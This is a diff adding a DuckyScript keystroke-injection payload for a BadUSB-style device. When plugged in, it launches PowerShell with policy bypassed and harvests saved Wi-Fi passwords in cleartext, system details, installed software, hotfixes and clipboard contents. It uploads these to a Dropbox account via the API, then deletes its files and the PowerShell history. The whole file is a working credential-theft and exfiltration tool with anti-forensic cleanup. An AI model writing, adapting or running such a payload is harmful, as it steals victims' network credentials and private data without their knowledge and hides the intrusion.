@@ -1,0 +1,87 @@
+DEFAULT_DELAY 50
+
+DELAY 5000
+
+GUI r
+DELAY 800
+STRING powershell -NoP -NonI -Exec Bypass
+ENTER
+DELAY 3000
+
+REM Vars
+STRING $temp="$env:TEMP"; $report="$temp\recon.txt"; $clip="$temp\clip.txt"; $out=""
+ENTER
+DELAY 400
+
+REM Wi-Fi
+STRING $out += "`n=== Wi-Fi Profiles ===`n"
+ENTER
+STRING try { $wifi = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }; foreach ($w in $wifi) { $p = (netsh wlan show profile name="$w" key=clear | Select-String "Key Content" | ForEach-Object { $_.Line.Split(":")[1].Trim() }); $out += "$w : $p`n" } } catch { $out += "WiFi error: $($_.Exception.Message)`n" }
+ENTER
+DELAY 600
+
+REM System Info
+STRING $out += "`n=== System Info ===`n"
+ENTER
+STRING try { $i = Get-ComputerInfo; $out += "OS: $($i.OsName)`nBuild: $($i.OsBuildNumber)`nArch: $($i.OsArchitecture)`nHost: $($i.CsName)`nMfg: $($i.CsManufacturer)`nModel: $($i.CsModel)`nCPU Cores: $($i.CsNumberOfProcessors)`nRAM: $([math]::Round($i.CsTotalPhysicalMemory / 1GB, 2)) GB`nUptime: $($i.OsUptime)`n" } catch { $out += "SysInfo error: $($_.Exception.Message)`n" }
+ENTER
+DELAY 600
+
+REM Installed Programs
+STRING $out += "`n=== Installed Programs ===`n"
+ENTER
+STRING try { $apps = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*,HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -EA SilentlyContinue | Where { $_.DisplayName } | Select DisplayName,DisplayVersion,Publisher,InstallDate | Sort DisplayName; $out += ($apps | Format-Table -AutoSize | Out-String) } catch { $out += "Programs error: $($_.Exception.Message)`n" }
+ENTER
+DELAY 800
+
+REM Hotfixes
+STRING $out += "`n=== Hotfixes ===`n"
+ENTER
+STRING try { $fixes = Get-HotFix | Select HotFixID,Description,InstalledOn,InstalledBy | Sort InstalledOn -Descending; $out += ($fixes | Format-Table -AutoSize | Out-String) } catch { $out += "Hotfixes error: $($_.Exception.Message)`n" }
+ENTER
+DELAY 600
+
+REM Clipboard
+STRING $out += "`n=== Clipboard ===`n"
+ENTER
+STRING try { Get-Clipboard | Out-File $clip -Encoding utf8 -EA SilentlyContinue; $out += (Get-Content $clip -Raw -EA SilentlyContinue) } catch { $out += "Clipboard error: $($_.Exception.Message)`n" }
+ENTER
+DELAY 600
+
+REM Write report locally first
+STRING $out | Out-File $report -Encoding utf8 -Force -EA SilentlyContinue
+ENTER
+DELAY 700
+
+REM Dropbox Upload - filename = HOSTNAME_TIMESTAMP.txt
+STRING $token = "YOUR_ACCESS_TOKEN_HERE"; $hostname = $env:COMPUTERNAME; $timestamp = (Get-Date -Format "yyyy-MM-dd_HH-mm-ss"); $filename = "$hostname_$timestamp.txt"; $path = "/OMG-Recon/$filename"
+ENTER
+DELAY 400
+STRING $headers = @{}; $headers["Authorization"] = "Bearer $token"; $headers["Dropbox-API-Arg"] = "{`"path`": `"$path`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"; $headers["Content-Type"] = "application/octet-stream"
+ENTER
+DELAY 400
+STRING try { Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $report -Headers $headers -EA SilentlyContinue; $out += "`nDropbox upload OK: $filename" } catch { $out += "`nDropbox upload fail: $($_.Exception.Message)" }
+ENTER
+DELAY 600
+
+STRING $clipFilename = "$hostname_$timestamp.clip.txt"; $clipPath = "/OMG-Recon/$clipFilename"
+ENTER
+DELAY 300
+STRING $headers["Dropbox-API-Arg"] = "{`"path`": `"$clipPath`", `"mode`": `"add`", `"autorename`": true, `"mute`": false}"
+ENTER
+DELAY 300
+STRING try { Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -InFile $clip -Headers $headers -EA SilentlyContinue; $out += "`nClipboard upload OK: $clipFilename" } catch { $out += "`nClipboard upload fail: $($_.Exception.Message)" }
+REM ENTER
+REM DELAY 400
+
+REM Re-write local report with upload status
+STRING $out | Out-File $report -Encoding utf8 -Force -EA SilentlyContinue
+ENTER
+DELAY 500
+
+REM Cleanup
+STRING Remove-Item $report,$clip -Force -EA SilentlyContinue; Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -Force -EA SilentlyContinue; Clear-History -EA SilentlyContinue; [GC]::Collect()
+ENTER
+
+STRING exit
+ENTER
